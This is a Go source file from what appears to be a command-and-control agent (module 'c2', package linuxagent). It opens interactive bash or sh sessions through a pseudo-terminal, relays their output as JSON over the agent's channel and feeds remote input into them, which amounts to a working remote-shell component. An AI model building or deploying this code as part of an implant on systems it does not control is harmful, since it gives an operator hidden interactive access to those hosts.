//go:build linux

package linuxagent

import (
	"io"
	"os"
	"os/exec"
	"strings"
	"sync"

	"github.com/creack/pty"

	"c2/internal/jsonutil"
)

// 与常见发行版 .bashrc 里 PS1 风格接近（绿 user@host、蓝路径、\$ root 为 #），
// 又不读 rc 文件，避免 pyenv 等钩子。若仅靠 --noprofile --norc，bash 会退回默认 bash-x.x$。
const linuxBashPS1 = `\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ `

func shellEnvForBash() []string {
	var out []string
	for _, e := range os.Environ() {
		if strings.HasPrefix(e, "PROMPT_COMMAND=") || strings.HasPrefix(e, "BASH_ENV=") {
			continue
		}
		out = append(out, e)
	}
	out = append(out,
		"TERM=xterm-256color",
		"BASH_ENV=",
		"PROMPT_COMMAND=",
		"PS1="+linuxBashPS1,
	)
	return out
}

type shellSession struct {
	pty *os.File
	cmd *exec.Cmd
}

var shellMu sync.Mutex
var shells = make(map[string]*shellSession)

func shellCreate(sessionID string, a *Agent) string {
	shellMu.Lock()
	defer shellMu.Unlock()
	if _, ok := shells[sessionID]; ok {
		return "Session already exists"
	}
	// 勿用 login shell（-l）：会执行 ~/.profile 等，常见 pyenv/nvm 初始化或 Ubuntu command-not-found 钩子在首屏刷错。
	// --noprofile --norc 跳过用户 rc，保留 -i 以便 job 控制等交互行为。
	var cmd *exec.Cmd
	if _, err := os.Stat("/bin/bash"); err == nil {
		cmd = exec.Command("/bin/bash", "--noprofile", "--norc", "-i")
		cmd.Env = shellEnvForBash()
	} else {
		cmd = exec.Command("/bin/sh", "-i")
		cmd.Env = append(os.Environ(), "TERM=xterm-256color")
	}
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return "Failed to start shell: " + err.Error()
	}
	// 与终端页 xterm 默认 cols/rows 一致；0×0 时部分 shell 不刷首屏提示符
	_ = pty.Setsize(ptmx, &pty.Winsize{Rows: 40, Cols: 120})
	shells[sessionID] = &shellSession{pty: ptmx, cmd: cmd}
	go shellReadLoop(sessionID, ptmx, a)
	return "Session created successfully"
}

func shellReadLoop(sessionID string, r io.Reader, a *Agent) {
	buf := make([]byte, 8192)
	for {
		n, err := r.Read(buf)
		if n > 0 {
			chunk := string(buf[:n])
			payload := map[string]string{
				"type":       "shell_output",
				"session_id": sessionID,
				"data":       chunk,
			}
			b, _ := jsonutil.MarshalCompact(payload)
			a.channelSend(b)
		}
		if err != nil {
			return
		}
	}
}

func shellWrite(sessionID string, input []byte) string {
	shellMu.Lock()
	s, ok := shells[sessionID]
	shellMu.Unlock()
	if !ok {
		return "Unknown session"
	}
	_, err := s.pty.Write(input)
	if err != nil {
		return "Write failed: " + err.Error()
	}
	return ""
}

func shellClose(sessionID string) string {
	shellMu.Lock()
	defer shellMu.Unlock()
	s, ok := shells[sessionID]
	if !ok {
		return "Unknown session"
	}
	_ = s.pty.Close()
	if s.cmd.Process != nil {
		_ = s.cmd.Process.Kill()
	}
	delete(shells, sessionID)
	return "Session closed successfully"
}
